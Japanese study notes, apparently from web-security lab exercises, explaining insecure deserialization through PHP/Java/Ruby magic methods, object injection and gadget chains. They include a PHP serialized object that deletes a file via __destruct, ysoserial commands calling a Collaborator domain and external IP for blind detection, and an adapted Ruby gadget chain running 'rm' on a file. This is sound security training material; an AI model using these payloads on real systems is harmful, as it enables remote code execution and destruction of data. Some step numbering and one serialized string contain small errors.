## マジックメソッドの前提知識

###### マジックメソッドとは

- 特定のイベントやシナリオが発生するたびに自動的に呼び出される特別なメソッド達
- メソッドの前に二重のアンダーバー(`__`)をつけたり、メソッド名を二重のアンダーバーで囲う
- 開発者は、マジックメソッドをクラスに追加することで、指定したイベントが発生した時に実行させるコードを事前に決定する
- 例えば、クラスのオブジェクトがインスタンス化されるたびに呼び出されるは：
	- PHP : `__construct()`
	- Python: `__init()__`

- マジックメソッド自体が危険なものではないが、マジックメソッド内で実行するコードがユーザ制御可能なデータ(例えばデシリアライズされたオブジェクト)を扱う場合にとても危険

- 言語によっては、デシリアライズ**処理中**に自動的に呼び出されるマジックメソッドが存在する。

#### デシリアライズ処理中に呼び出されるマジックメソッド

###### PHPのマジックメソッド

- `unserialize()`メソッド→ `__wakeup()`マジックメソッドを探して呼び出す

##### Java

- `readObject()`
###### 条件

- [2. 安全でないデシリアライズの検出とデータ形式](2.%20安全でないデシリアライズの検出とデータ形式.md#Javaでデシリアライズされている兆候)にあるように、`java.io.Serializable`をインプリメントしているクラス
```java
import java.io.Serializable
...

public class ExampleClass implements Serializable {
...
}
```

###### Javaのマジックメソッド

- 通常、シリアライズされたオブジェクトの再初期化で必要なデフォルトの処理は`ObjectInputStream.readObject()`メソッドで定義されている(≒コンストラクタ)

- しかし、上の条件が満たされている時に、特別な再初期化処理を設定する必要がある場合、クラス内で`readObject()`メソッドを定義する
- これにより、`readObject()`はマジックメソッドとして機能するようになる
```java
public class ExampleClass implements Serializable {
	private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
	{
	    // implementation
	}
}
```

## 悪用例：任意のオブジェクトの注入

###### 基本概念と具体例

- [3. シリアライズされたオブジェクトの操作による悪用](3.%20シリアライズされたオブジェクトの操作による悪用.md)では、提供されたオブジェクトを編集し悪用してきた
- しかし、これは任意の[📕](../../Misc/📕.md#オブジェクト型)を注入し、より多くの攻撃可能性へ展開するもの

- もし攻撃者がシリアライズされたデータ(=オブジェクト)のクラスを操作することができれば、デシリアライズ後、もしくはデシリアライズ中に実行されるコードに影響を与えることができる。

- デシリアライズ処理中に自動で実行されるマジックメソッドを利用して、長い一連のメソッド呼び出しを含むGadget chainを開始することができる→ [4.マジックメソッドによる悪用](4.マジックメソッドによる悪用.md#Gadget%20chains)


###### 具体例：オブジェクト(=シリアライズされたデータ)のクラスを操作する with ソースコード

```php
<?php
// 1. Userクラス
class UserClass {
    // クラスのプロパティ
    public $username;
    public $password;

    // コンストラクタ
    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }
}

// 2. fileクラス
class fileClass {
    private $file_path;
    private $lock_file_path;

    public function __construct($file_path) {
        $this->file_path = $file_path;
        $this->lock_file_path = $file_path . ".lock";
    }

    private function isLocked() {
        return file_exists($this->lock_file_path);
    }

	//メソッドの定義...(省略)

    function __destruct() { //lock_file_pathが存在するなら削除する処理
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

- もう既にUserClassのオブジェクトが生成され、シリアライズされているとする
```php
// User クラスのオブジェクトを生成する例
$user = new User('wiener', 'peter');
$serialized_user = serialize($user)

echo $serialized_user 
```
```php
0:9:"UserClass":2:{s:8:"username";s:6:"wiener";s:8:"password";s:5:"peter";}
```
- リクエストのsession cookieにシリアライズされたオブジェクトが設定されているとする
```http
Cookie: session=0:9:"UserClass":2:{s:8:"username";s:6:"wiener";s:8:"password";s:5:"peter";}
```

- このとき、利用可能なクラス(fileクラス)のプロパティ(`lock_file_path`)に任意のデータを設定したオブジェクトを作成する
```php
O:9:"fileClass":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

- これにより、マジックメソッド(`__destruct()`)が呼び出され、指定したファイルが削除される

###### 攻撃される原因

- デシリアライズするとき、一体何をデシリアライズしているのか検証することは少ない
- つまり、意図されたクラスのオブジェクトじゃなくても注入できる
- 意図されていないオブジェクトを注入することで、ロジックの例外を引き起こし、かつ、悪意あるオブジェクトはインスタンス化される。

###### ステップ

1. シリアライズされたオブジェクトを発見し、Inspectorでデコードする。`O:`で始まるか？(=クラスを意味する)
2. ソースコードを発見し、探索する
3. ソースコード内に利用可能なクラスはあるか確認する
4. クラスの中に、デシリアライズ処理中に自動で実行されるマジックメソッドはあるか？
5. マジックメソッドの中でユーザ制御可能なデータに対する危険な処理をしているものはあるか？
- ↓例
```php
function __destruct(){//ファイルの削除
	if (file_exists($this->lock_file_path)) {
		unlink($this->lock_file_path);
	}
}
```

4. 利用可能なクラスで、プロパティに任意の値をセットしたクラスをシリアライズし注入する(=任意のオブジェクトの注入)
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
- これにより、`fileClass`クラスのインスタンスが生成され、プロパティには任意の値がセットされる。
- セットした任意の値に対してマジックメソッドが処理を実行する

# ⭐️Gadget chains

###### ガジェットチェーンとは

- ガジェット：　アプリケーションのコードの[📕](../../Misc/📕.md#スニペット)で、攻撃者の目的達成に役立つもの。
	- ガジェット単体では悪いことはしないケースも多い。

- ガジェットチェーン：　ガジェットからガジェットへ入力データを渡していき、最終的に危険な「sinkガジェット」にデータを渡すこと([1. DOM-based vulnの基本と対策(概要)](../../Client-side/DOM-based%20vuln/1.%20DOM-based%20vulnの基本と対策(概要).md#シンク(sink))

###### ガジェットチェーンの特徴

- 攻撃者がコントロールするのは、あくまでもガジェットチェーンに渡されるデータだけ。
	- (他のタイプのエクスプロイトは攻撃者がペイロードを構築するけど、ガジェットチェーンは違う)
- 通常、マジックメソッドを使用して行われる攻撃で、"kick-off gadget"とも呼ばれる

###### 安全でないデシリアライズ検出に便利なガジェットチェーン(Payload)

- すべてのpayloadが任意のコードを実行できるわけではないが、以下の2種類のpayloadを使用すれば、どんなサーバでも安全でないデシリアライズを検出できる
- *URLDNS*:
	- ターゲットのWebアプリのバージョンやライブラリに関係なく動作する
	- 検出目的で最も普遍的なガジェットチェーン
	- シリアライズされたオブジェクトを見つけたら、`URLDNS`を使用して攻撃者のサーバ(Collaborator)とのDNS lookupをトリガーするオブジェクトを生成できる
	- このオブジェクトがデシリアライズされると、設定されたURLへのDNSクエリが実行される。
	- この方法は、シリアライズされたデータをどのように扱っているかを調査するための便利な手段
```zsh
java -jar ysoserial-all.jar URLDNS 'http://COLLABORATOR_DOMAIN' | [base64 | xxd]
```

- *JRMPClient*:
	- もう1つの検出用ガジェットチェーン
	- サーバは指定されたIPアドレス(×ホスト名)へTCP接続を試みる
	- URLDNSを試しても、DNS lookupがFWで保護されているとき、有用
	- ローカルアドレス(`127.0.0.1`)のペイロードに対しては即座に応答が返るが、外部アドレスのペイロードに対しては応答が遅延する場合、==遅延が起きる＝サーバがFWに接続(中継のため)しようとした==ことがわかる。= デシリアライズ処理が行われた
	- つまり、ブラインドでも、サーバ上でデシリアライズ処理が行われたかどうかわかる。

- ローカル
```
java -jar ysoserial-all.jar JRMPClient '127.0.0.1' | [base64 | xxd]
```
-  Google(`host google.com`)
```zsh
java -jar ysoserial-all.jar JRMPClient '142.250.76.142' | [base64 | xxd]
```

#### Javaの安全でないデシリアライズの悪用ステップ w/ ysoserial

1. [2. 安全でないデシリアライズの検出とデータ形式](2.%20安全でないデシリアライズの検出とデータ形式.md#シリアライズされたオブジェクトデータの先頭文字)から、Javaの16進数(`xxe`)かBase64(`base64`)かを明らかにする


4. 算出されたペイロードを元の形式にエンコードし、元々のシリアライズされたオブジェクトを上書きする
	- ⚠️：ペイロード全体をエンコードすること。`/`など特殊文字がペイロード中に複数入っているから

###### ソースコードにアクセスできない場合

3.  [4.マジックメソッドによる悪用](4.マジックメソッドによる悪用.md#安全でないデシリアライズ検出に便利なガジェットチェーン(Payload))を使用して、応答時間の差でデシリアライズ処理がされたことを確認する

## 文書化されたガジェットチェーンの利用(without tool)

###### 基本概念

- ターゲットのWebアプリで使用されているフレームワークにガジェットチェーンを悪用するツールがない場合
- 利用可能なエクスプロイトがインターネットで文書化されていないか探す。
	- そのまま利用できなくても、==少し改変すれば利用できる可能性==があることを念頭に

- 文書化された悪用方法を利用するには、言語やフレームワークの基本的な理解が必要
- 自分でオブジェクトをシリアライズして基本的な動きを理解する必要があるかも

#### Rubyの場合

###### 1. Rubyかどうかの判別

- `scanner`ならRubyのオブジェクトだとわかる
- Base64でデコードすれば内容が解析できる、バイナリ形式のオブジェクトである
- Internal Server Error => Rubyだとわかる。

###### 2. インターネットでPayloadを探す。 

- [devcraft.io](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html#:~:text=The%20final%20gadget%20could%20then%20be%20constructed%20to%20trigger%20a%20call%20to%20Kernel.system(%22id%22)%3A)が見つかる

###### 3. 実行したいコマンドに編集する

- [Web上でRubyの実行結果出力まで出来るアプリ](https://www.onlinegdb.com/online_ruby_compiler)上でコードの編集をする

```rb
rs.instance_variable_set('@git_set', "id")
```
	↓
```rb
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
```

###### 4. 元の形式にオブジェクトをエンコードして、上書きする

- Base64の結果を出力するため、最後の2行を書き換える
```ruby
puts payload.inspect
puts Marshal.load(payload)
```
	↓
```ruby
require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

- 実行して得られた出力をHackvortorでエンコードし、元々のオブジェクトを上書きする
